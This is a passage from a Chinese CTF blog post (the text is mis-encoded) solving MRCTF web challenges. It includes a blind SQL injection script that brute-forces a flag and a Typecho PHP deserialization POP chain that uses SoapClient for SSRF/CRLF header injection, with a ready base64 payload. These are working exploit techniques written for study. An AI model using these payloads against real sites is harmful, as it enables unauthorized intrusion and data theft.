class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure>
<p>åªè¦ç»•è¿‡ä¸€ä¸ªç§é’¥å³å¯sqlæ³¨å…¥ã€‚<br>é‚£ä¹ˆæ³¨æ„åˆ°å…¬,ç§é’¥æ˜¯é€šè¿‡mt_rand()ç”Ÿæˆçš„ï¼Œé‚£å°±å¥½è¯´ã€‚ç›´æ¥./mt_rèµ°èµ·<br>å…ˆå°†å…¬é’¥è½¬ä¸ºè„šæœ¬å¯è¯†åˆ«çš„æ•°æ®</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span></span><br><span class="line">str2=<span class="string">'KVQP0LdJKRaV3n9D'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<p>ç„¶åè®¾å®šå¥½éšæœºæ•°ç§å­ï¼ŒæŒ‰å…ˆå…¬é’¥,å†ç§é’¥çš„é¡ºåºç”Ÿæˆã€‚å¾—åˆ°ç§é’¥<code>XuNhoueCDCGc</code><br>ç›´æ¥sqlæ³¨å…¥å³å¯</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://aa90a604-c5bb-44d9-8589-b9614155f505.merak-ctf.site/login.php'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&#123;&#125;-"</span>:</span><br><span class="line">        payload = <span class="string">"1' or if(ascii(substr(flag,"</span>+str(i)+<span class="string">",1))="</span>+str(ord(str1))+<span class="string">",sleep(3),1)#"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">            <span class="string">'password'</span>: payload,</span><br><span class="line">            <span class="string">'Private_key'</span>: <span class="string">'XuNhoueCDCGc'</span>,</span><br><span class="line">            <span class="string">'login'</span>: <span class="string">'1'</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += str1</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>æ‰“å¼€kali+çˆ†ç ´ç§å­èŠ±äº†10å¤šåˆ†é’Ÿï¼Œå‰å‡ è¡€åˆæ²¡äº†ã€‚å¿ƒé‡Œè‹¦ã€‚<br>äº‹åä»”ç»†ä¸€çœ‹sqlè¯­å¥å·²ç»å†™å¥½äº†ï¼Œæ‰€ä»¥åªè¦ä¸‡èƒ½å¯†ç å°±è¡Œäº†ã€‚éš¾æ€ªæ‰‹é€Ÿæ…¢ï¼Œè¯¥æ‰“ã€‚</p>
<h2 id="Ezpop-revenge"><a href="#Ezpop-revenge" class="headerlink" title="Ezpop_revenge"></a>Ezpop_revenge</h2><p>æ‰“ç®—å†™wpå°±æ˜¯ä¸ºäº†è¿™é¢˜ã€‚è´¨é‡ç»å¯¹å¤Ÿã€‚<br>å¼€å§‹ä¸‹è½½<a href="http://www.zipçš„æºç ,ç„¶åå‘ç°æ˜¯typeEchoçš„æ¨¡æ¿ï¼Œä¹‹å‰æ²¡å®¡è¿‡è¿™ä¸ªæ¨¡æ¿ç›¸å…³çš„popé“¾,ä¸Šå»æ‰¾äº†ä¸‹è¿˜æŒºæœ‰æ„æ€ã€‚" target="_blank" rel="noopener">www.zipçš„æºç ,ç„¶åå‘ç°æ˜¯typeEchoçš„æ¨¡æ¿ï¼Œä¹‹å‰æ²¡å®¡è¿‡è¿™ä¸ªæ¨¡æ¿ç›¸å…³çš„popé“¾,ä¸Šå»æ‰¾äº†ä¸‹è¿˜æŒºæœ‰æ„æ€ã€‚</a><br>è·Ÿzjyå¸ˆå‚…å®¡å‡ºäº†å…¥å£+åˆ©ç”¨ç‚¹å°±æ‡’å¾—å†™pocäº†ã€‚ä¸è¿‡è¿˜æ˜¯å¾—åŠ¨æ‰‹åšåšæ‰è¡Œã€‚ï¼ˆæ¯•ç«Ÿå®é™…å†™èµ·æ¥å¤šåŠç›´æ¥æ‹‰èƒ¯ï¼‰</p>
<p>é¦–å…ˆæ˜¯ç»ˆç»“ç‚¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">'flag'</span>]= <span class="string">"MRCTF&#123;******&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"æˆ‘æ‰Œyour problem?\n</span></span><br><span class="line"><span class="string">only localhost can get flag!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ˜¾ç„¶æ˜¯è¦ssrfã€‚è€Œä¸”è¿™é‡Œè®©æˆ‘è«åæƒ³åˆ°äº†ä¹‹å‰LCTFçš„bestphpâ€™srevenge.å°±æ˜¯é€šè¿‡Soapæ‰“ssrfçš„ä¸€ä¸ªtrick.<br>ç„¶åæ‰¾å…¥å£äº†ã€‚<br>è¿™é‡Œéš¾å—çš„æ˜¯phpstormå…¨å±€æœç´¢æ‰¾ä¸åˆ°unserializeã€‚è¿˜æ˜¯zjyå¸ˆå‚…å¸®æˆ‘æ‰¾åˆ°çš„.åŸæ¥æ˜¯æ’ä»¶é‡Œé¢æ‰‹å†™çš„ä¸€ä¸ªç±»<br>ä¸»ä½“å‡½æ•°å¤§æ¦‚è¿™ä¹ˆå¤š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">'hello'</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">'world'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'admin'</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'C0incid3nc3'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/file|assert|eval|[`\'~^?&lt;&gt;$%]+/i"</span>,base64_decode($_POST[<span class="string">'C0incid3nc3'</span>])) === <span class="number">0</span>)</span><br><span class="line">                unserialize(base64_decode($_POST[<span class="string">'C0incid3nc3'</span>]));</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Not that easy."</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„åˆ°wakeupåè‡ªç„¶æ˜ç™½ååºåˆ—åŒ–çš„è§¦å‘æ–¹å¼äº†.åŒæ—¶æŒ‰ç…§LCTFçš„ç»éªŒï¼Œè¿™é‡Œå¤§æ¦‚ç‡æ˜¯ä¸€ä¸ªä¸€ä¸ªåŒå‚æ•°å‡½æ•°ï¼Œå³<code>call_user_func</code>+Soapæ‰“ssrfã€‚<br>è·Ÿä¸€ä¸‹Typecho_Dbç±»<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/5.PNG" alt></p>
<p>æœä¸å…¶ç„¶æœ‰ä¸ª<code>call_user_func</code>ã€‚è€Œä¸”å‚æ•°éƒ½å¯æ§ï¼Œé“¾å­ç»“æŸã€‚æ‰€ä»¥å…¶å®å°±æ˜¯ä¸ªåŸé¢˜é­”æ”¹äº†ä¸‹ã€‚å½“æ—¶çœ‹åˆ°è¿™å°±æ²¡åšäº†ã€‚</p>
<p>ç„¶è€Œäº‹æƒ…æ²¡è¿™ä¹ˆç®€å•ã€‚åæ¥å‘ç°ä¸€ä¸ªé—®é¢˜ã€‚é‚£å°±æ˜¯LCTFå¯ä»¥åˆ©ç”¨sessionå¤„ç†å™¨å°†Soapçš„åºåˆ—åŒ–æ•°æ®å†™åˆ°sessioné‡Œï¼Œç„¶å<code>call_user_func</code>è§¦å‘ã€‚è¿™é‡Œå´ä¸è¡Œã€‚é‚£å°±éœ€è¦æŠŠé“¾å­å†å¤šæŒ–ä¸€ä¸‹.</p>
<p>æ³¨æ„åˆ°ä¹‹å‰çš„ç»“å°¾æç¤ºæˆ‘ä»¬<code>__toString()</code>ã€‚å…¨å±€æœç´¢ä¸‹toStringï¼Œè·Ÿåˆ°\var\Typecho\Db\Query.phpä¸‹ã€‚<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/6.PNG" alt><br>æ³¨æ„åˆ°è¿™é‡Œï¼Œ<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>æ—¶æ‰§è¡Œäº†<code>_adapter</code>çš„<code>parseSelect()</code>æ–¹æ³•ã€‚åº”è¯¥å¯ä»¥æ»¡è¶³æˆ‘ä»¬è§¦å‘Soapçš„æ¡ä»¶ï¼Œå³è°ƒç”¨ä¸å­˜åœ¨æ–¹æ³•ã€‚<br>æ¢³ç†å®Œé‡ç‚¹åå¼€å§‹æ„é€ äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$db &#x3D; new Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]);</span><br><span class="line">&#x3D;&gt;call_user_func(array($adapterName, &#39;isAvailable&#39;))</span><br><span class="line">    &#x3D;&gt; __toString()&#x2F;&#x2F;Typecho_Db_Query</span><br><span class="line">      &#x3D;&gt; $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)</span><br></pre></td></tr></table></figure>

<p>åªç”¨åˆ°ä¸¤ä¸ªç±»,popé“¾ä¸é•¿ï¼ˆhhhï¼‰<br>poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'X-Forwarded-For:127.0.0.1'</span>,</span><br><span class="line">            <span class="string">"Cookie: PHPSESSID=b92shmac496iqkek97vkuetnn0"</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; <span class="string">'abc'</span>, <span class="string">'location'</span> =&gt; $target, <span class="string">'user_agent'</span> =&gt; <span class="string">'byc404^^'</span> . join(<span class="string">'^^'</span>, $headers)));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = [<span class="string">'action'</span> =&gt; <span class="string">"SELECT"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence = <span class="keyword">array</span>(<span class="string">"hello"</span> =&gt; <span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$poc = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line">$poc = preg_replace(<span class="string">" /\^\^/"</span>, <span class="string">"\r\n"</span>, $poc);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($poc);</span><br></pre></td></tr></table></figure>
<p>ç„¶åè§¦å‘çš„åœ°æ–¹æ²¡æ‰¾åˆ°â€¦â€¦åŸæ¥åœ¨/var/Typeecho/Plugin.phpé‡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span><span class="params">($pluginName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">self</span>::$_plugins[<span class="string">'activated'</span>][$pluginName] = <span class="keyword">self</span>::$_tmp;</span><br><span class="line">    <span class="keyword">self</span>::$_tmp = <span class="keyword">array</span>();</span><br><span class="line">    Helper::addRoute(<span class="string">"page_admin_action"</span>,<span class="string">"/page_admin"</span>,<span class="string">"HelloWorld_Plugin"</span>,<span class="string">'action'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆå°±å°è¯•æäº¤pocã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post: C0incid3nc3&#x3D;TzoxMzoiSGVsbG9Xb3JsZF9EQiI6MTp7czoyNjoiAEhlbGxvV29ybGRfREIAY29pbmNpZGVuY2UiO2E6MTp7czo1OiJoZWxsbyI7TzoxNjoiVHlwZWNob19EYl9RdWVyeSI6Mjp7czoyNjoiAFR5cGVjaG9fRGJfUXVlcnkAX2FkYXB0ZXIiO086MTA6IlNvYXBDbGllbnQiOjU6e3M6MzoidXJpIjtzOjM6ImFiYyI7czo4OiJsb2NhdGlvbiI7czoyNToiaHR0cDovLzEyNy4wLjAuMS9mbGFnLnBocCI7czoxNToiX3N0cmVhbV9jb250ZXh0IjtpOjA7czoxMToiX3VzZXJfYWdlbnQiO3M6Nzk6ImJ5YzQwNA0KWC1Gb3J3YXJkZWQtRm9yOjEyNy4wLjAuMQ0KQ29va2llOiBQSFBTRVNTSUQ9bW9pODU2cXVxcHU2bXV2bWhnYTdrbzdwNTMiO3M6MTM6Il9zb2FwX3ZlcnNpb24iO2k6MTt9czozMDoiAFR5cGVjaG9fRGJfUXVlcnkAX3NxbFByZUJ1aWxkIjthOjE6e3M6NjoiYWN0aW9uIjtzOjY6IlNFTEVDVCI7fX19fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>ç„¶å<code>?admin=1</code>è®¿é—®å³å¯ã€‚<br>ç„¶ååº”è¯¥æ˜¯è·ŸLCTFä¸€æ ·ï¼Œæœ€å¥½payloadè·Ÿæ£€æŸ¥flagçš„PHPSESSIDä¸è¦ç”¨åŒä¸€ä¸ªã€‚æˆ‘çœ‹Nepnepå¸ˆå‚…ä»¬çš„wpé‡Œè¯´ç›´æ¥ç”Ÿæˆçš„payloadè¿‡ä¸å»ã€‚æˆ‘åæ­£??????äººå®¶ç‰¹æ„è®¾å®šçš„base64encodeæ ¹æœ¬ä¸å­˜åœ¨privateç‰¹æ®Šå­—ç¬¦è¿‡ä¸å»çš„é—®é¢˜å•Šã€‚åæ­£æˆ‘æ˜¯å¯ä»¥ç›´æ¥æ‰“çš„,åº”è¯¥æ²¡å•¥é—®é¢˜ã€‚<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/7.PNG" alt></p>
<p>å¤§æ¦‚è¿™ä¹ˆå¤šï¼Œé¢˜ç›®æ¯•ç«Ÿæ–°æ‰‹é¢˜ã€‚æ”¶è·è°ˆä¸ä¸Šï¼Œæ²¡æ‰é“¾å­å°±ç®—æ»¡æ„äº†ã€‚æœ€åä¸€é¢˜ä¹Ÿæé†’äº†è‡ªå·±æ‹’ç»æƒ³å½“ç„¶ï¼Œé“¾å­æ²¡å†™å‡ºæ¥å°±ä¸èƒ½ç©ºæƒ³ï¼Œå®åœ¨çš„pocæ‰æ˜¯ç‹é“ã€‚è¿‡å‡ å¤©æŠŠå¹½çµçŒ«çš„æ€»ç»“ä¸‹ã€‚æ¯•ç«Ÿå›½é™…èµ›ä¸Šä¹Ÿé‡åˆ°äº†ã€‚</p>

          
            <div class='article_footer'>
              
                
  
    
    



  

  
    
    



  

  
    
    

<section class="widget copyright  desktop mobile">
  <div class='content'>
    
      <blockquote>
        
          
            <p>åšå®¢å†…å®¹éµå¾ª ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº« 4.0 å›½é™… (CC BY-NC-SA 4.0) åè®®</p>

          
        
          
            <p>æœ¬æ–‡æ°¸ä¹…é“¾æ¥æ˜¯ï¼š<a href=https://www.bycsec.top/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/>https://www.bycsec.top/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/</a></p>
          
        
      </blockquote>
    
  </div>
</section>

  


              
            </div>
          
        </div>
        
          


  <section class='meta' id="footer-meta">
    <div class='new-meta-box'>
      
        
          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-11-05T17:04:29+08:00">
  <a class='notlink'>
    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
    <p>æ›´æ–°äºï¼šNov 5, 2020</p>
  </a>
</div>

        
      
        
          
  
  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>CTF</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/WEB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>WEB</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/wp/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>wp</p></a></div>


        
      
        
          

        
      
        
          

        
      
    </div>
  </section>


        
        
          <div class="prev-next">
            
              <a class='prev' href='/2020/03/30/VolgaCTF2020Qualifier%E5%A4%8D%E7%8E%B0/'>
                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>VolgaCTF2020Qualifierå¤ç°</p>
                <p class='content'>æ¯”èµ›æ²¡æœ‰æ€ä¹ˆè®¤çœŸæ‰“ï¼Œä½†æ˜¯æ¯•ç«Ÿé¢˜è¿˜æ˜¯çœ‹äº†çš„ã€‚é™¤äº†å¹½çµçŒ«ä»¥å¤–çš„é¢˜ä¹Ÿæ˜¯å¾ˆæœ‰ä»·å€¼çš„ï¼Œå¥½å¥½å­¦ä¹ ä¸€æ³¢ã€‚
NetCorpè¿™ä¸ªå‘¨æœ«æœ€å¤§çš„æ”¶è·å°±æ˜¯åšäº†å‡ é“javaé¢˜ï¼Œå¯¹javaé¢˜çš„ç›¸å…³å¥—è·¯æœ‰äº†ä¸€å®šäº†è§£ã€‚æ¯”å¦‚æ­¤é¢˜ï¼Œ...</p>
              </a>
            
            
              <a class='next' href='/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/'>
                <p class='title'>ä½¿ç”¨Soapçš„ssrf/crlfæ”»å‡»<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
                <p class='content'>è¿™å‡ å¤©åœ¨buuä¸Šç–¯ç‹‚åˆ·é¢˜ã€‚çªç„¶æ¥è§¦åˆ°äº†ä¸€ä¸ªä¹‹å‰æ²¡æœ‰æ³¨æ„è¿‡çš„çŸ¥è¯†ç‚¹ã€‚é‚£å°±æ˜¯ä½¿ç”¨Soapè¿›è¡Œssrfã€‚ç›®å‰åšåˆ°çš„å‡ é“é¢˜ä¸ªäººè§‰å¾—è¿˜æ˜¯éå¸¸æœ‰è¥å…»çš„ã€‚é‚£ä¹ˆå¹²è„†æ€»ç»“ä¸‹å…³äºphp+Soapçš„ç›¸å…³çŸ¥è¯†ã€‚



...</p>
              </a>
            
          </div>
        
      </section>
    </article>
  

  
    <!-- æ˜¾ç¤ºæ¨èæ–‡ç« å’Œè¯„è®º -->



  <article class="post white-box reveal comments shadow">
    <section class="article typo">
      <p ct><i class='fas fa-comments'></i> è¯„è®º</p>
      
      
      
      
      
      
        <section id="comments">
          <div id="valine_container" class="valine_thread">
            <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
          </div>
        </section>
      
      
    </section>
  </article>


  




<!-- æ ¹æ®é¡µé¢mathjaxå˜é‡å†³å®šæ˜¯å¦åŠ è½½MathJaxæ•°å­¦å…¬å¼js -->



  <script>
    window.subData = {
      title: 'WUSTCTF&MRCTFéƒ¨åˆ†webé¢˜è§£',
      tools: true
    }
  </script>


</div>
<aside class='l_side'>
  
  

  
    
    


